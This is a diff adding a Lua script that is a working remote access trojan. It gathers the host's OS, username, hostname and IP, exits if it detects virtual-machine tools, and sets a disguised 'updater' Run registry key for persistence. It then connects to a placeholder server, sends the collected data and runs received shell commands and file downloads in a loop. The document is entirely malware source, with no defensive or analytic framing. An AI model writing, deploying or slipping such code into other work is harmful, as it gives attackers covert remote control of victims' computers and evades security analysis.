@@ -1,0 +1,151 @@
+
+local socket = require("socket")
+local http = require("socket.http")
+local ltn12 = require("ltn12")
+local mime = require("mime")
+
+local function getOS()
+    local raw_os_name = ''
+    if jit then
+        raw_os_name = jit.os
+    else
+        local fh = io.popen("uname -s", "r")
+        if fh then
+            raw_os_name = fh:read("*l")
+            fh:close()
+        end
+    end
+
+    raw_os_name = raw_os_name:lower()
+
+    if raw_os_name:find("windows") then
+        return "Windows"
+    elseif raw_os_name:find("linux") then
+        return "Linux"
+    elseif raw_os_name:find("mac") or raw_os_name:find("darwin") then
+        return "MacOS"
+    else
+        return "Unknown"
+    end
+end
+
+local system_info = {
+    os = getOS(),
+    user = os.getenv("USERNAME") or os.getenv("USER"),
+    hostname = socket.dns.gethostname(),
+    ip = socket.dns.toip(socket.dns.gethostname())
+}
+
+local SERVER_ADDRESS = "hidden-server.example"
+local SERVER_PORT = 1234
+
+local function connectToServer()
+    local client = assert(socket.tcp())
+    client:settimeout(10)
+    client:connect(SERVER_ADDRESS, SERVER_PORT)
+    return client
+end
+
+local function sendData(client, data)
+    local encoded = mime.b64(data)
+    client:send(encoded .. "\n")
+end
+
+local function receiveData(client)
+    local line, err = client:receive('*l')
+    if not line then return nil, err end
+    local decoded = mime.unb64(line)
+    return decoded
+end
+
+local function executeCommand(cmd)
+    local result = ""
+    local f = io.popen(cmd, "r")
+    if f then
+        result = f:read("*a")
+        f:close()
+    else
+        result = "Failed to execute command."
+    end
+    return result
+end
+
+local function isVirtualMachine()
+    local processesToCheck = {
+        "VBoxService",
+        "vmtoolsd",
+        "vboxtray",
+        "vmwaretray",
+        "xenstored",
+        "qemu-ga"
+    }
+    for _, procName in ipairs(processesToCheck) do
+        local handle = io.popen("tasklist /FI \"IMAGENAME eq " .. procName .. ".exe\"")
+        local output = handle:read("*a")
+        handle:close()
+        if output:find(procName) then
+            return true
+        end
+    end
+    return false
+end
+
+local function setupPersistence()
+    if system_info.os == "Windows" then
+        local exePath = arg[0]
+        local cmd = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /d \"" .. exePath .. "\" /f"
+        os.execute(cmd)
+    end
+end
+
+local function main()
+    if isVirtualMachine() then
+        os.exit() -- Exit if inside VM
+    end
+
+    setupPersistence()
+
+    local client = connectToServer()
+    sendData(client, "INFO:" .. system_info.os .. "|" .. system_info.user .. "|" .. system_info.hostname .. "|" .. system_info.ip)
+
+    while true do
+        local command, err = receiveData(client)
+        if not command then
+            client:close()
+            client = connectToServer()
+        else
+            if command == "exit" then
+                client:close()
+                break
+            elseif command:sub(1, 4) == "cmd:" then
+                local cmdToRun = command:sub(5)
+                local output = executeCommand(cmdToRun)
+                sendData(client, output)
+            elseif command:sub(1, 3) == "dl:" then
+                local url = command:sub(4)
+                local filename = url:match("^.+/(.+)$")
+                local body = {}
+                local res, code, headers = http.request{
+                    url = url,
+                    sink = ltn12.sink.table(body)
+                }
+                if res and code == 200 then
+                    local file = io.open(filename, "wb")
+                    if file then
+                        file:write(table.concat(body))
+                        file:close()
+                        sendData(client, "Downloaded: " .. filename)
+                    else
+                        sendData(client, "Failed to save file.")
+                    end
+                else
+                    sendData(client, "Failed to download file.")
+                end
+            else
+                sendData(client, "Unknown command received.")
+            end
+        end
+    end
+end
+
+main()
